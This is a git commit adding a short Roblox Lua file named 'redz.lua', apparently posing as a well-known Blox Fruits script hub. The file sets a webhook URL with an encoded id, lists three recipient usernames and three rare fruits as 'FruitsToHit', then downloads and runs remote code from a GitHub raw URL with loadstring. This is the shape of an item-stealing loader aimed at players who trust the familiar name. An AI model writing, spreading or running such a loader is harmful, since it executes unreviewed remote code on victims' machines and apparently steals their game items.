8320abdb8261326b0a6b10773d1318d098b7d3bd
RedzNew <nm.mastercdk@gmail.com>
2025-04-08 20:50:13 +0700

    Source.luau

---
+++ redz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=WGx2MWhoRzB3eFVqLVBTYjJ5MlMtdzoxSl9sbF81RlRFQWNWM2lXZXpDSGdpV0ZINTdmR2FwQjM1QkZBX3JlVkt2bmFhT05tYWduWjFPY2JKVnk3Q3lnVXduZk1QNmNpcTVBcEV1UjZnaEp3N1VUcksyc2FjbFdWMHpoNFFEcDE3dURUQ1pIbEQtZ29Obl96OVczbG00cHUwa2lCbDF3M1dmUnE1UzF1T3RCOVhzYnhJSEJpTW9JZnViZVBsb01YUE0"
+Usernames = {"tarronfj", "mfzgnr", "fritzowjr"} 
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas"} 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
